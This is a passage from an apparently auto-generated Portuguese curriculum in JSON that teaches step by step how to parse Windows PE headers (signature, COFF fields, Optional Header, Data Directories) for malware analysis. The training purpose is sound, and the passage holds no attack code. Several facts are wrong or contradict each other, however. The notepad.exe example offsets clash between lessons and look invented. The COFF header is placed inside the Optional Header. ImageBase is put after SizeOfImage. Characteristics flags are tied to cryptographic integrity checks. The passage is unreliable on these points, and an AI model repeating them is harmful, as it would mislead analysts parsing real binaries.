                                    "Se não matching, anote discrepâncias (ex: 00 00 00 00 indica possível ELF ou stub removido).",
                                    "Salve screenshot ou exporte snippet hex para registro."
                                  ],
                                  "verification": "Bytes exatos 50 45 00 00 confirmados visualmente ou via script simples.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Editor hexadecimal",
                                    "Script Python opcional para automação (struct.unpack)"
                                  ],
                                  "tips": "Use highlight de busca no editor para '50450000'; ignore case em hex.",
                                  "learningObjective": "Identificar e validar a assinatura mágica PE\u0000\u0000 com precisão byte-level.",
                                  "commonMistakes": [
                                    "Ler apenas ASCII sem hex bytes",
                                    "Confundir com COFF header seguinte",
                                    "Ignorar null bytes terminadores"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar Autenticidade e Documentar Resultados",
                                  "subSteps": [
                                    "Confirme que após a signature vem o COFF File Header (próximos 20 bytes válidos).",
                                    "Teste em amostras maliciosas ou modificadas para contrastar falhas.",
                                    "Gere relatório: offset, bytes encontrados, status (válido/inválido).",
                                    "Automatize validação básica com ferramenta como CFF Explorer ou pefile Python.",
                                    "Discuta implicações: signature ausente pode indicar packer ou formato falso."
                                  ],
                                  "verification": "Relatório escrito confirma signature e contexto; teste passa em amostras conhecidas.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Ferramentas PE viewer (CFF Explorer, pefile lib)",
                                    "Amostras PE variadas (benignas e maliciosas)"
                                  ],
                                  "tips": "Combine manual + tool para aprendizado; sempre valide múltiplas amostras.",
                                  "learningObjective": "Aplicar validação em contexto real de análise de segurança, documentando para relatórios.",
                                  "commonMistakes": [
                                    "Aceitar signature sem checar COFF seguinte",
                                    "Não testar edge cases como PE32+ ou stubs custom",
                                    "Falta de documentação"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando notepad.exe (Windows): Abra em HxD, vá para offset 0x3C (valor e_lfanew=0xF0), salte para 0xF0, confirme bytes 50 45 00 00. Teste com malware sem signature para ver falha.",
                              "finalVerifications": [
                                "e_lfanew lido corretamente e offset navegável.",
                                "Bytes 50 45 00 00 matching exato no offset.",
                                "COFF header seguinte é coerente (ex: machine type válido).",
                                "Validação manual e via tool concordam.",
                                "Relatório documenta offset, bytes e status.",
                                "Teste em 3+ amostras diferentes passa."
                              ],
                              "assessmentCriteria": [
                                "Precisão na leitura de e_lfanew (100% correto).",
                                "Identificação correta da signature PE (sem falsos positivos).",
                                "Documentação completa com screenshots/hex dumps.",
                                "Tratamento de edge cases (ex: offset inválido).",
                                "Tempo de execução dentro do estimado.",
                                "Explicação clara das implicações em segurança."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Python: Parsing binário com fread/struct.",
                                "Criptografia: Verificação de integridade em malwares.",
                                "Redes: Análise de payloads em tráfego (ex: PE em droppers).",
                                "Sistemas Operacionais: Entendimento de loaders Windows.",
                                "Forense Digital: Validação em investigações de incidentes."
                              ],
                              "realWorldApplication": "Em análise de malware, validação da signature PE confirma formato antes de dissecação, detectando evasões como stubs customizados ou conversores ELF-PE usados em ataques cross-platform."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.4.1"
                            ]
                          },
                          {
                            "id": "10.1.5.4.2.2",
                            "name": "Analisar campos do COFF File Header",
                            "description": "Interpretar campos como Machine (0x014C para x86, 0x8664 para x64), NumberOfSections, TimeDateStamp e Characteristics (executável, DLL etc.).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar e compreender a estrutura do COFF File Header no PE",
                                  "subSteps": [
                                    "Abra um arquivo PE de exemplo em um editor hexadecimal (ex: HxD).",
                                    "Localize o DOS Header (MZ signature em offset 0x00), encontre o offset para PE Header via 'e_lfanew' (offset 0x3C).",
                                    "Navegue até o PE Signature (0x00004550) e avance 4 bytes para o início do COFF File Header.",
                                    "Identifique os offsets dos campos principais: Machine (0-1), NumberOfSections (2-3), TimeDateStamp (4-7), Characteristics (18-19).",
                                    "Consulte a documentação oficial do formato PE para confirmar tamanhos e posições."
                                  ],
                                  "verification": "Confirme que encontrou o COFF Header imediatamente após a PE Signature e liste os offsets corretos dos campos chave.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Editor hexadecimal (HxD ou 010 Editor)",
                                    "Especificação PE/COFF da Microsoft (PDF)",
                                    "Arquivo PE de exemplo (ex: notepad.exe)"
                                  ],
                                  "tips": "Use busca por 'PE\\x00\\x00' para localizar rapidamente o PE Header; marque offsets com bookmarks no editor.",
                                  "learningObjective": "Compreender a posição exata e estrutura fixa do COFF File Header dentro do PE Optional Header.",
                                  "commonMistakes": [
                                    "Confundir com DOS Header ou Optional Header",
                                    "Ignorar endianness little-endian",
                                    "Ler offsets errados devido a alinhamentos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Interpretar o campo Machine",
                                  "subSteps": [
                                    "Leia os 2 bytes iniciais do COFF Header (little-endian).",
                                    "Converta o valor hex para decimal e consulte a tabela de máquinas: 0x014C (IMAGE_FILE_MACHINE_I386 x86), 0x8664 (x64), 0x01C0 (ARM).",
                                    "Anote o tipo de arquitetura detectado.",
                                    "Verifique consistência com outras partes do binário (ex: seções de código).",
                                    "Teste com amostras x86 e x64 para comparar."
                                  ],
                                  "verification": "Explique verbalmente ou anote: 'Machine=0x014C indica executável x86 compatível com Intel 80386.'",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Editor hex",
                                    "Tabela de valores Machine da spec PE",
                                    "Amostras PE x86 e x64"
                                  ],
                                  "tips": "Use calculadora hex para conversão rápida; memorize valores comuns como 0x014C e 0x8664.",
                                  "learningObjective": "Mapear valores hex do campo Machine para tipos de arquitetura de CPU suportados.",
                                  "commonMistakes": [
                                    "Ler big-endian em vez de little-endian",
                                    "Confundir com outros campos de 2 bytes",
                                    "Ignorar máquinas exóticas como ARM"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar NumberOfSections e TimeDateStamp",
                                  "subSteps": [
                                    "Leia NumberOfSections (bytes 2-3): converta hex para decimal (ex: 0x0005 = 5 seções).",
                                    "Conte as seções no binário (após COFF Header) para validar o número.",
                                    "Leia TimeDateStamp (bytes 4-7): converta para timestamp Unix (ex: 0x5A3B2C4D → data de compilação).",
                                    "Use ferramenta online ou Python (struct.unpack) para converter timestamp para data legível.",
                                    "Compare com propriedades do arquivo (ex: data de modificação)."
                                  ],
                                  "verification": "Liste: '5 seções esperadas, confirmei .text, .data etc.; compilado em 2023-01-15 às 10:30.'",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Editor hex",
                                    "Python com struct ou online epoch converter",
                                    "Spec PE para offsets de seções"
                                  ],
                                  "tips": "Salte para o primeiro Optional Header para ver SizeOfOptionalHeader e confirmar navegação às seções.",
                                  "learningObjective": "Extrair e validar número de seções e data/hora de compilação do binário.",
                                  "commonMistakes": [
                                    "Não validar contando seções reais",
                                    "Erro na conversão de timestamp de 32-bit",
                                    "Confundir com file time no DOS Header"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar o campo Characteristics",
                                  "subSteps": [
                                    "Leia os 2 bytes finais do COFF Header (18-19).",
                                    "Decomponha em flags bit a bit: bit 0=RELOCS_STRIPPED, bit 1=EXECUTABLE_IMAGE, bit 2=LINE_NUMS_STRIPPED, etc.",
                                    "Identifique tipo: EXE (IMAGE_FILE_EXECUTABLE_IMAGE), DLL (IMAGE_FILE_DLL).",
                                    "Anote flags relevantes para segurança (ex: LARGE_ADDRESS_AWARE).",
                                    "Compare com comportamento do binário (ex: rundll32 para DLLs)."
                                  ],
                                  "verification": "Resuma: 'Characteristics=0x010F: Executável, 32-bit, não relocável, indica PE EXE padrão.'",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Editor hex",
                                    "Lista completa de flags Characteristics da spec PE",
                                    "Amostras EXE e DLL"
                                  ],
                                  "tips": "Use bitwise AND em calculadora para isolar flags; foque em bits 1,2,5 para tipo básico.",
                                  "learningObjective": "Decodificar flags binárias do Characteristics para classificar o tipo e propriedades do executável.",
                                  "commonMistakes": [
                                    "Ler como valor único sem bitmask",
                                    "Confundir flags de COFF com Optional Header",
                                    "Ignorar flags de segurança como NX_COMPAT"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar e validar a análise completa do COFF File Header",
                                  "subSteps": [
                                    "Compile um relatório com todos os campos: Machine, NumberOfSections, TimeDateStamp, Characteristics.",
                                    "Use uma ferramenta como CFF Explorer ou pefile Python para cross-check.",
                                    "Identifique anomalias (ex: timestamp futuro = possível malware).",
                                    "Salve anotações em um template de análise PE.",
                                    "Teste em 2-3 arquivos diferentes."
                                  ],
                                  "verification": "Gere um relatório escrito confirmando valores e interpretações sem discrepâncias com ferramenta de validação.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "CFF Explorer ou Python pefile library",
                                    "Template de relatório PE",
                                    "Múltiplos arquivos PE"
                                  ],
                                  "tips": "Automatize validação com script Python simples para prática futura.",
                                  "learningObjective": "Integrar análises de todos os campos em um perfil completo do binário.",
                                  "commonMistakes": [
                                    "Não cross-validar com ferramentas",
                                    "Sobrepor interpretações sem evidência hex",
                                    "Ignorar contexto de segurança"
                                  ]
                                }
                              ],
                              "practicalExample": "Em notepad.exe (Windows 10 x86): COFF Header em offset 0xF8. Machine=0x014C (x86), NumberOfSections=0x0005 (5 seções: .text, .rdata etc.), TimeDateStamp=0x5D8E4A2B (2019-10-01), Characteristics=0x010F (executável, não relocável, 32-bit). Confirme com CFF Explorer.",
                              "finalVerifications": [
                                "Corretamente identifica arquitetura via Machine em 3 amostras diferentes.",
                                "Valida NumberOfSections contando entradas de seção real.",
                                "Converte TimeDateStamp para data precisa e discute implicações.",
                                "Decompõe Characteristics em pelo menos 4 flags corretas.",
                                "Gera relatório sem erros detectados por ferramenta de validação.",
                                "Identifica anomalias como timestamps inconsistentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização e leitura de offsets (100% match com spec).",
                                "Correta interpretação de valores hex (sem erros de endianness ou conversão).",
                                "Validação cruzada com contagem manual e ferramentas (zero discrepâncias).",
                                "Profundidade na decomposição de flags (cobre bits principais).",
                                "Relatório claro e estruturado com evidências hex.",
                                "Identificação de implicações para segurança (ex: DLL vs EXE)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender alinhamentos e estruturas de dados binários.",
                                "Sistemas Operacionais: Loaders PE e carregamento de executáveis no Windows.",
                                "Forense Computacional: Timestamps para timelines de infecção malware.",
                                "Criptografia: Verificação de integridade via Characteristics flags.",
                                "Engenharia Reversa: Base para análise de binários com IDA Pro/Ghidra."
                              ],
                              "realWorldApplication": "Em análise de malware, determine arquitetura para escolher disassembler correto (x86 vs x64), identifique DLLs para hooks, use TimeDateStamp para rastrear campanhas, e flags para detectar packing/obfuscation em ameaças como ransomware ou trojans."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.4.1"
                            ]
                          },
                          {
                            "id": "10.1.5.4.2.3",
                            "name": "Calcular tamanhos baseados no header",
                            "description": "Usar SizeOfOptionalHeader para determinar o fim do COFF Header e o início do Optional Header.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar o COFF File Header no arquivo PE",
                                  "subSteps": [
                                    "Abra o arquivo PE em um hex editor e localize o DOS Header.",
                                    "Encontre o campo e_lfanew nos últimos 4 bytes do DOS Header (offset 0x3C).",
                                    "Navegue para o offset indicado por e_lfanew para encontrar a assinatura 'PE\\0\\0'.",
                                    "Identifique os próximos 20 bytes como o COFF File Header.",
                                    "Confirme o tamanho fixo de 20 bytes do COFF File Header."
                                  ],
                                  "verification": "Apontar corretamente o início e fim do COFF File Header em um hex dump de um arquivo PE.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Hex editor (ex: HxD, 010 Editor)",
                                    "Arquivo PE de exemplo (ex: simple.exe)"
                                  ],
                                  "tips": "Sempre valide a assinatura PE\\0\\0 antes de prosseguir para evitar offsets errados.",
                                  "learningObjective": "Compreender a posição exata do COFF File Header na estrutura PE.",
                                  "commonMistakes": "Confundir o offset e_lfanew com outros campos do DOS Header; ignorar a validação da assinatura PE."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e extrair o valor de SizeOfOptionalHeader",
                                  "subSteps": [
                                    "No COFF File Header, navegue para o offset 16 (0x10) relativo ao início do COFF.",
                                    "Leia os 2 bytes seguintes (WORD little-endian) para obter SizeOfOptionalHeader.",
                                    "Converta o valor hex para decimal (ex: 0xE0 = 224 bytes).",
                                    "Anote que este valor representa o tamanho do Optional Header subsequente.",
                                    "Verifique consistência com variantes PE32 (224 bytes) ou PE32+ (240 bytes)."
                                  ],
                                  "verification": "Extrair e interpretar corretamente o valor de SizeOfOptionalHeader de um arquivo PE real.",
                                  "estimatedTime": "5-10 minutos",
                                  "materials": [
                                    "Hex editor",
                                    "Calculadora hex/decimal (ex: Windows Calculator em modo programador)",
                                    "Mesma arquivo PE"
                                  ],
                                  "tips": "Lembre-se: little-endian, então inverta bytes se visualizando em big-endian mentalmente.",
                                  "learningObjective": "Localizar e decodificar precisamente o campo SizeOfOptionalHeader.",
                                  "commonMistakes": "Ler em big-endian; usar offset errado (não é 18, mas 16); confundir com NumberOfSections."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Calcular o fim do COFF Header e o início do Optional Header",
                                  "subSteps": [
                                    "Calcule start_COFF = e_lfanew + 4 (após assinatura PE).",
                                    "Calcule fim_COFF = start_COFF + 20 (tamanho fixo do COFF).",
                                    "Determine início_Optional = fim_COFF.",
                                    "Use SizeOfOptionalHeader para calcular fim_Optional = início_Optional + SizeOfOptionalHeader (para navegação futura).",
                                    "Marque esses offsets no hex editor para visualização."
                                  ],
                                  "verification": "Fornecer cálculos corretos de offsets para fim COFF e início Optional em um exemplo dado.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Hex editor",
                                    "Papel e caneta ou planilha para cálculos de offset",
                                    "Arquivo PE"
                                  ],
                                  "tips": "O tamanho do COFF é sempre fixo em 20 bytes; SizeOfOptionalHeader guia o próximo bloco, não altera o COFF.",
                                  "learningObjective": "Executar cálculos precisos de offsets usando SizeOfOptionalHeader como referência.",
                                  "commonMistakes": "Assumir tamanho variável para COFF; esquecer +4 após e_lfanew; não usar little-endian nos cálculos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar os cálculos e navegar para seções subsequentes",
                                  "subSteps": [
                                    "Compare offsets calculados com o hex dump para confirmar alinhamento.",
                                    "Navegue para início_Optional e verifique campos iniciais conhecidos (ex: Magic 0x10B para PE32).",
                                    "Calcule posição da Section Table: após Optional Header.",
                                    "Teste com múltiplos arquivos PE (32-bit e 64-bit).",
                                    "Documente os offsets em um relatório simples."
                                  ],
                                  "verification": "Navegar corretamente para Optional Header e identificar Magic corretamente em pelo menos 2 arquivos PE.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Hex editor",
                                    "Vários arquivos PE (32-bit e 64-bit)",
                                    "Documentação PE oficial (MSDN)"
                                  ],
                                  "tips": "Use busca por 'PE\\0\\0' no editor para validar múltiplas vezes.",
                                  "learningObjective": "Validar e aplicar os cálculos em cenários reais para confiança.",
                                  "commonMistakes": "Não testar com PE32+ (SizeOfOptionalHeader=240); ignorar alinhamentos de seção."
                                }
                              ],
                              "practicalExample": "Em um notepad.exe (PE32), e_lfanew=0x80, start_COFF=0x84, fim_COFF=0x98 (20 bytes), SizeOfOptionalHeader=0xE0 (offset 0x94-95), início_Optional=0x98. Navegue para 0x98 e confirme Magic=0x10B.",
                              "finalVerifications": [
                                "Offsets calculados coincidem com posições reais no hex dump.",
                                "Valor de SizeOfOptionalHeader extraído corretamente e interpretado.",
                                "Início do Optional Header identificado e Magic validado.",
                                "Cálculo de fim do Optional Header correto para Section Table.",
                                "Testado em pelo menos dois arquivos PE diferentes.",
                                "Documentação dos offsets sem erros aritméticos."
                              ],
                              "assessmentCriteria": [
                                "Precisão 100% nos cálculos de offsets (fim COFF e início Optional).",
                                "Correta interpretação de SizeOfOptionalHeader (little-endian, valor exato).",
                                "Validação prática em hex editor com evidências (screenshots ou logs).",
                                "Compreensão conceitual: explicar por que COFF é fixo e Optional variável.",
                                "Aplicação em variantes PE32/PE32+ sem erros.",
                                "Tempo de execução dentro dos estimados com qualidade."
                              ],
                              "crossCurricularConnections": [
                                "Engenharia Reversa: Parsing de binários em ferramentas como PEiD ou CFF Explorer.",
                                "Programação em C/C++: Implementar parser PE com structs IMAGE_FILE_HEADER.",
                                "Segurança Cibernética: Análise de malware packed ou obfuscado.",
                                "Arquitetura de Computadores: Entender little-endian e alinhamentos de memória.",
                                "Desenvolvimento de Software: Debugging de loaders de executáveis."
                              ],
                              "realWorldApplication": "Na análise forense digital e detecção de malware, calcular esses tamanhos permite automatizar o parsing de PE para identificar seções suspeitas, detectar packers como UPX ou injeções de código malicioso em executáveis Windows."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.4.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.4.3",
                        "name": "Optional Header",
                        "description": "Cabeçalho opcional (obrigatório em executáveis) contendo informações sobre o carregamento, como ponto de entrada, tamanho de imagem e tabelas de importação/exportação.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.4.3.1",
                            "name": "Interpretar campos padrão do Optional Header",
                            "description": "Analisar Magic (PE32 ou PE32+), AddressOfEntryPoint (RVA do entry point), ImageBase e tamanhos de seções (.text, .data etc.).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar e interpretar o campo Magic no Optional Header",
                                  "subSteps": [
                                    "Abra o arquivo PE em uma ferramenta de análise como CFF Explorer ou pefile em Python.",
                                    "Navegue até a seção Optional Header (após o padrão COFF File Header).",
                                    "Identifique o offset do campo Magic (primeiros 2 bytes do Optional Header).",
                                    "Converta o valor hexadecimal para decimal e compare com 0x10B (PE32) ou 0x20B (PE32+).",
                                    "Anote se é 32-bit ou 64-bit e implications para análise posterior."
                                  ],
                                  "verification": "Confirme que o Magic corresponde a PE32 (0x10B) ou PE32+ (0x20B) e documente em um relatório.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Ferramenta PE viewer (CFF Explorer, PE-bear) ou biblioteca Python pefile; arquivo PE de exemplo (ex: notepad.exe)",
                                  "tips": "Use little-endian para leitura correta dos bytes.",
                                  "learningObjective": "Compreender como o Magic diferencia variantes PE32/PE32+ para seleção de ferramentas de análise.",
                                  "commonMistakes": "Confundir com o DOS Header Magic (MZ); ignorar endianness."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Interpretar o campo AddressOfEntryPoint (OEP RVA)",
                                  "subSteps": [
                                    "Localize o campo AddressOfEntryPoint no Optional Header (offset fixo: 16 bytes após Magic em PE32).",
                                    "Leia o valor RVA (Relative Virtual Address) em hexadecimal.",
                                    "Calcule o endereço virtual absoluto somando ao ImageBase (para preview).",
                                    "Correlacione com a seção .text para validar se aponta para código executável.",
                                    "Anote potenciais packing/malware se OEP for suspeito (ex: fora de seções normais)."
                                  ],
                                  "verification": "RVA do OEP é válido e aponta para uma seção executável; teste com debugger se possível.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Mesmas ferramentas do Step 1; debugger como x64dbg para preview.",
                                  "tips": "RVA é relativo à imagem carregada; não confunda com offset no arquivo.",
                                  "learningObjective": "Saber como o OEP indica o ponto de entrada da execução do programa.",
                                  "commonMistakes": "Interpretar RVA como offset de arquivo; não validar contra seções."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o campo ImageBase",
                                  "subSteps": [
                                    "Encontre o ImageBase no Optional Header (offset: após SizeOfImage, cerca de 28 bytes em PE32).",
                                    "Registre o endereço virtual preferido de carregamento (tipicamente 0x400000).",
                                    "Verifique se é padrão para 32/64-bit e note desvios (comum em malware).",
                                    "Entenda implicações para relocação se ASLR estiver ativo.",
                                    "Compare com base real em dump de memória se disponível."
                                  ],
                                  "verification": "ImageBase documentado corretamente e correlacionado com arquitetura detectada pelo Magic.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Ferramentas do Step 1; documentação MS PE/COFF spec.",
                                  "tips": "ImageBase é o VA base; use calculadora hex para somas.",
                                  "learningObjective": "Entender o papel do ImageBase na alocação de memória virtual do processo.",
                                  "commonMistakes": "Confundir com PreferredImageBase em PE32+; ignorar relocações."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar tamanhos de seções padrão (.text, .data etc.)",
                                  "subSteps": [
                                    "Localize SizeOfCode, SizeOfInitializedData e SizeOfUninitializedData no Optional Header.",
                                    "Correlacione: SizeOfCode ≈ soma de seções .text/.code executáveis.",
                                    "SizeOfInitializedData ≈ .data + .rdata; SizeOfUninitializedData ≈ .bss.",
                                    "Valide somando tamanhos reais das seções no Section Headers.",
                                    "Identifique anomalias como SizeOfCode=0 (possível packer)."
                                  ],
                                  "verification": "Tamanhos batem com Section Headers (± padding); anomalias anotadas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Ferramentas do Step 1; lista de Section Headers.",
                                  "tips": "Use script Python para automação de soma de tamanhos.",
                                  "learningObjective": "Mapear campos de tamanho do Optional Header às seções reais do PE.",
                                  "commonMistakes": "Não alinhar com VirtualSize vs RawSize; ignorar padding de 0x1000."
                                }
                              ],
                              "practicalExample": "Usando notepad.exe (PE32): Magic=0x10B, AddressOfEntryPoint=0x100A0 (RVA em .text), ImageBase=0x400000, SizeOfCode=0x1A000 (cobre .text), SizeOfInitializedData=0x5000 (.data/.rdata). Valide com CFF Explorer.",
                              "finalVerifications": [
                                "Magic corretamente classificado como PE32/PE32+.",
                                "OEP RVA aponta para seção executável válida.",
                                "ImageBase consistente com arquitetura.",
                                "Tamanhos de seções somam corretamente com Section Headers.",
                                "Relatório resume todos os campos com valores hex/dec.",
                                "Anomalias (se houver) justificadas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na leitura de offsets e valores hex.",
                                "Correta correlação entre campos (ex: OEP + ImageBase).",
                                "Validação cruzada com seções reais.",
                                "Identificação de implicações de segurança (ex: OEP suspeito).",
                                "Clareza no relatório com screenshots ou dumps.",
                                "Tempo de execução dentro do estimado."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Assembly: Mapear OEP para disassembly.",
                                "Sistemas Operacionais: Entender carregamento PE no Windows.",
                                "Programação: Conhecer seções .text/.data em C/C++.",
                                "Criptografia: Detectar packing via tamanhos anômalos."
                              ],
                              "realWorldApplication": "Em análise de malware, interpretar esses campos detecta packers (OEP alterado), injeções (ImageBase custom) e estima tamanho de payload em .data, auxiliando em reverse engineering e detecção de ameaças."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.4.2"
                            ]
                          },
                          {
                            "id": "10.1.5.4.3.2",
                            "name": "Examinar Data Directories",
                            "description": "Listar e descrever as 16 entradas de Data Directory, como Export Table, Import Table, Resource Table e sua RVA e tamanho.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Estrutura e Localização das Data Directories no Optional Header do PE",
                                  "subSteps": [
                                    "Leia a documentação oficial do formato PE sobre o Optional Header, focando na seção Data Directory.",
                                    "Identifique que as Data Directories começam no offset 96 (0x60h) a partir do início do Optional Header.",
                                    "Note que cada entrada é composta por 8 bytes: 4 bytes para RVA (Virtual Address) e 4 bytes para Size.",
                                    "Confirme que há exatamente 16 entradas fixas, indexadas de 0 a 15.",
                                    "Desenhe um diagrama simples mostrando o layout: Optional Header → File Header Size → Data Directory (16 x 8 bytes)."
                                  ],
                                  "verification": "Crie um esboço ou diagrama do Optional Header destacando a posição exata das Data Directories e liste os offsets.",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": [
                                    "Documentação Microsoft PE/COFF Specification (PDF)",
                                    "Editor hexadecimal como HxD ou 010 Editor",
                                    "Diagrama de estrutura PE (online ou impresso)"
                                  ],
                                  "tips": "Use um editor hex com busca por 'PE\\0\\0' para localizar rapidamente o cabeçalho PE.",
                                  "learningObjective": "Entender a posição fixa e o formato binário das 16 Data Directories no Optional Header.",
                                  "commonMistakes": [
                                    "Confundir offset das Data Directories com o início do Optional Header.",
                                    "Ignorar que o RVA é relativo à imagem carregada em memória, não offset no arquivo."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Listar e Descrever as 16 Entradas das Data Directories",
                                  "subSteps": [
                                    "Memorize os nomes e índices: 0=Export Table, 1=Import Table, 2=Resource Table, 3=Exception Table, 4=Certificate Table, 5=Base Relocation Table, 6=Debug, 7=Architecture, 8=Global Ptr, 9=TLS Table, 10=Load Config Table, 11=Bound Import, 12=Import Address Table, 13=CLR Runtime Header, 14=Delay Import Descriptor, 15=Reserved.",
                                    "Para cada uma, escreva uma descrição breve: ex. Export Table (RVA aponta para tabela de funções exportadas).",
                                    "Agrupe em categorias: Import/Export (0-2), Security/Debug (4-7), etc.",
                                    "Crie uma tabela com índice, nome, propósito e exemplo de uso.",
                                    "Revise associando cada uma a cenários reais, como Import Table para dependências DLL."
                                  ],
                                  "verification": "Recite verbalmente ou escreva a lista completa das 16 entradas com descrições curtas sem consultar notas.",
                                  "estimatedTime": "30-40 minutos",
                                  "materials": [
                                    "Tabela de referência das IMAGE_DIRECTORY_ENTRY_* (da spec PE)",
                                    "Planilha ou bloco de notas para tabela personalizada",
                                    "Vídeo tutorial curto sobre PE internals (ex. YouTube: LiveOverflow)"
                                  ],
                                  "tips": "Use mnemônicos: 'E-I-R-E-C-B-D-A-G-T-L-B-I-C-D-R' para lembrar a sequência.",
                                  "learningObjective": "Dominar os nomes, índices e propósitos das 16 Data Directories.",
                                  "commonMistakes": [
                                    "Confundir Import Table (1) com Import Address Table (12).",
                                    "Esquecer entradas menos comuns como Architecture (7) ou Reserved (15)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Localizar e Ler Data Directories em um Arquivo PE Real",
                                  "subSteps": [
                                    "Abra um executável PE simples como notepad.exe em um editor hex.",
                                    "Localize: MZ → e_lfanew (offset 0x3C) → PE signature → COFF Header → Optional Header.",
                                    "Navegue para offset 96 bytes no Optional Header e leia as primeiras entradas (ex. RVA e Size da Export Table).",
                                    "Anote RVA e Size para todas as 16, convertendo little-endian se necessário.",
                                    "Valide seguindo um RVA (ex. Export) até a estrutura real e confirme o cabeçalho dela."
                                  ],
                                  "verification": "Capture screenshot das Data Directories no hex editor e anote RVA/Size das 3 primeiras entradas corretamente.",
                                  "estimatedTime": "25-35 minutos",
                                  "materials": [
                                    "Arquivo PE sample: notepad.exe ou calc.exe (do Windows System32)",
                                    "HxD ou ImHex (editor hex gratuito)",
                                    "PE-bear ou CFF Explorer (ferramentas de análise PE)"
                                  ],
                                  "tips": "Ative exibição de RVA no editor hex para facilitar navegação.",
                                  "learningObjective": "Praticar a extração manual de RVA e Size das Data Directories em binários reais.",
                                  "commonMistakes": [
                                    "Ler bytes em big-endian ao invés de little-endian.",
                                    "Perder-se no Optional Header por não calcular o tamanho correto do COFF Header."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e Verificar as Data Directories em Contexto",
                                  "subSteps": [
                                    "Para Export/Import/Resource, siga os RVAs e descreva as estruturas apontadas (ex. NumberOfNames na Export Directory).",
                                    "Compare RVA com seções do arquivo (Section Headers) para ver onde mapeiam.",
                                    "Use ferramenta como PE-bear para validar suas leituras manuais.",
                                    "Identifique entradas zero (RVA=0, Size=0) e explique implicações (ex. sem exports).",
                                    "Documente um relatório resumido com achados chave."
                                  ],
                                  "verification": "Gere um relatório de 1 página listando RVA/Size de todas 16 e descrevendo 3 principais.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "PE-bear ou DIE (Detect It Easy) para validação",
                                    "Sample PE com exports/imports ricos (ex. custom EXE compilado)"
                                  ],
                                  "tips": "RVA 0 geralmente indica 'ausente'; foque em non-zero para prática.",
                                  "learningObjective": "Analisar o significado prático de RVA e Size no contexto de análise binária.",
                                  "commonMistakes": [
                                    "Assumir RVA = offset no arquivo (use ImageBase para calcular VA).",
                                    "Ignorar alinhamentos de seção ao seguir RVAs."
                                  ]
                                }
                              ],
                              "practicalExample": "Abra notepad.exe no HxD: vá para offset ~0x180 (Optional Header), +96 bytes para Data Directory. Export Table (entry 0): RVA 0x50E8, Size 0x1C. Siga RVA para ver Export Directory com NameRVA apontando para 'notepad.exe'. Repita para Import Table (entry 1): liste DLLs como kernel32.dll.",
                              "finalVerifications": [
                                "Listar corretamente as 16 entradas com índices e nomes.",
                                "Identificar posição exata (offset 96 no Optional Header).",
                                "Ler e anotar RVA/Size precisos de um sample PE para entries 0-2.",
                                "Explicar propósito de pelo menos 5 entradas não-triviais (ex. TLS, Delay Import).",
                                "Seguir um RVA até a estrutura e validar com ferramenta.",
                                "Diferenciar RVA de file offset."
                              ],
                              "assessmentCriteria": [
                                "Precisão na lista das 16 entradas (100% nomes corretos).",
                                "Correção na leitura de bytes (little-endian, offsets exatos).",
                                "Profundidade nas descrições (propósito + exemplo para cada).",
                                "Habilidade em navegação manual no hex editor sem erros.",
                                "Relatório claro e estruturado com evidências (screenshots/anotações).",
                                "Compreensão contextual (ligação com seções e runtime)."
                              ],
                              "crossCurricularConnections": [
